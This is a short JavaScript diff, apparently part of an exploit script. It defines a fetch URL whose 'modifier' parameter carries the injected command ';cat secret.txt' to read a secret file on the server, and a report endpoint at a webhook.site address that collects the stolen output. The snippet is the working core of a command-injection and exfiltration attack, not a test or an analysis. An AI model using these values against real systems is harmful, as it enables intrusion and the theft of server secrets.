@@ -1,3 +1,4 @@
+
 const fetchEndpoint = '/api/cal?modifier=;cat secret.txt';  // The endpoint to fetch data from
 const reportEndpoint = 'https://webhook.site/1bcc4367-b9f6-47da-9d18-8637d16009bb';  // The server to send data or error to
 
